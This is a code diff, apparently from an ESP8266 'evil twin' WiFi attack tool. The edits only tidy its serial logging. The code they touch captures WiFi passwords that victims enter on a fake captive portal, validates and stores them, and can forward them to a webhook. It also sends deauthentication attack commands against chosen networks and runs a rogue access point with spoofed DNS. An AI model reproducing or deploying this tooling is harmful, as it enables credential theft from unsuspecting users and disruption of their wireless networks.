@@ -46,7 +46,6 @@ void handleDashboard() { //handles the dashboard page
 }
 
 void handlePost(){
-  Serial.printf("=====PasswordEntry=====\n");
   String pass = webServer.arg("wifiPassword"); //Getting the value of the Password field
 
   if (validate == true){ //if validation is turned try to connect to the wifi that is beeing validated
@@ -69,7 +68,7 @@ void handlePost(){
   }
 
   if (slaveStatus == 3 || validate == false){ //if conected or validation is turned off start password saving and redirecting to the restarting page
-    Serial.printf("Password Correct\n");
+    Serial.printf("Password Correct\n\n");
     redirect("/restarting");
 
     if(webhookUrl != ""){ //if webhook url is not empty therefore webhook is enabled send the command to send a webhook
@@ -91,18 +90,13 @@ void handlePost(){
     digitalWrite(LED_BUILTIN, LOW);
 
   } else { //if password was not correct redirect to the wrong password page
-    Serial.printf("Password Incorrect\n");
+    Serial.printf("Password Incorrect\n\n");
     
     redirect("/incorrectPass");
   }
-
-  Serial.printf("WiFi Status : %i\n", slaveStatus);
-  Serial.printf("=====PasswordEntry=====\n\n");
 }
 
 void handlePostSSID() {
-  Serial.printf("=====NewSSID=====\n");
-
   String postedSSID = webServer.arg("ssid");
 
   targetSSID = postedSSID;
@@ -118,83 +112,61 @@ void handlePostSSID() {
   WiFi.softAP(postedSSID); //restart ap with the new ssid
   currentSSID = postedSSID;
 
-  Serial.printf("SSID changed to: %s\n", currentSSID.c_str());
-
-  Serial.printf("=====NewSSID=====\n\n");
+  Serial.printf("SSID changed to: %s\n\n", currentSSID.c_str());
 }
 
 void clearPass(){ //deletes all stored passwords
-  Serial.printf("=====PasswordCleaner=====\n");
-
   allPass = "";
   passEnd = passStart; //Setting the password end location -> starting position.
   EEPROM.write(passEnd, '\0');
   EEPROM.commit();
-  Serial.printf("All passwords deleted\n");
+  Serial.printf("All passwords deleted\n\n");
   redirect("/dashboard");
-
-  Serial.printf("=====PasswordCleaner=====\n\n");
 }
 
 void handleLang(){ //change the language for the pages the user will see
-  Serial.printf("=====Language=====\n");
-
   indexLang = webServer.arg("lang");
-  Serial.printf("Language changed to: %s\n", indexLang.c_str());
+  Serial.printf("Language changed to: %s\n\n", indexLang.c_str());
   redirect("/dashboard");
-
-  Serial.printf("=====Language=====\n\n");
 }
 
 void handleDeauth(){ //gets the target and duration for the deauth attack and sends the data to the deauth function
-  Serial.printf("=====Deauther=====\n");
-
   int target = webServer.arg("target").toInt(); 
 
-  Serial.printf("Starting to Deauth: %s(%s), on channel: %i\n", WiFi.SSID(target).c_str(), WiFi.BSSIDstr(target).c_str(), WiFi.channel(target));
+  Serial.printf("Starting to Deauth: %s(%s), on channel: %i\n\n", WiFi.SSID(target).c_str(), WiFi.BSSIDstr(target).c_str(), WiFi.channel(target));
   
   esp.printf("deauth|%i|%s", WiFi.channel(target), WiFi.BSSIDstr(target).c_str()); //send the deauth command to the slave
 
   redirect("/dashboard");
-  Serial.printf("=====Deauther=====\n\n");
 }
 
 void stopDeauth(){
-  Serial.printf("=====Deauther=====\n");
-
   esp.printf("stopDeauthing"); 
   redirect("/dashboard");
 
-  Serial.printf("Done Deauthing\n");
-  Serial.printf("=====Deauther=====\n\n");
+  Serial.printf("Done Deauthing\n\n");
 }
 
 void setValidate(){
   redirect("/dashboard");
-  Serial.printf("=====SetValidation=====\n");
-
+  
   if (webServer.arg("validate") == "on"){ validate = true; } else { validate = false; }
 
-  Serial.printf("Validate set to %s\n", validate ? "true" : "false");
-  Serial.printf("=====SetValidation=====\n\n");
+  Serial.printf("Validate set to %s\n\n", validate ? "true" : "false");
 }
 
 void setWebhookUrl(){
   redirect("/dashboard");
-  Serial.printf("=====setWebhookUrl=====\n");
 
   webhookUrl = webServer.arg("url");
 
-  if(webhookUrl != ""){ Serial.printf("Webhook Url set to %s\n", webhookUrl.c_str()); } else { Serial.print("Webhook disabled\n"); }
-  Serial.printf("=====setWebhookUrl=====\n\n");
+  if(webhookUrl != ""){ Serial.printf("Webhook Url set to %s\n\n", webhookUrl.c_str()); } else { Serial.print("Webhook disabled\n"); }
 }
 
 void setup(){
   Serial.begin(115200);
   EEPROM.begin(512);
   esp.begin(115200);
-
-  Serial.printf("\n\n=====Setup=====\n");
 
   if (EEPROM.read(0) != '\0') {
     EEPROM.write(0, '\0');
@@ -221,7 +193,7 @@ void setup(){
   
   Serial.printf("Soft ap setup: %s\n", WiFi.softAP(currentSSID) ? "Sucessfully!" : "Failed!");
   Serial.printf("AP SSID: %s\n", currentSSID.c_str());
-  Serial.printf("DNS server setup: %s\n", dnsServer.start(DNS_PORT, "*", APIP) ? "Sucessfully!" : "Failed!"); //DNS spoofing (Only for HTTP)
+  Serial.printf("DNS server setup: %s\n\n", dnsServer.start(DNS_PORT, "*", APIP) ? "Sucessfully!" : "Failed!"); //DNS spoofing (Only for HTTP)
 
   webServer.on("/", [](){  webServer.send(200, "text/html", Index(indexLang, favicon, targetSSID)); });
   webServer.on("/post", handlePost);
@@ -243,8 +215,6 @@ void setup(){
   //Enable the built-in LED
   pinMode(LED_BUILTIN, OUTPUT); digitalWrite(LED_BUILTIN, HIGH); //enable the builtin LED
   pinMode(D5, INPUT);
-
-  Serial.printf("=====Setup=====\n\n");
 }
 
 void loop(){
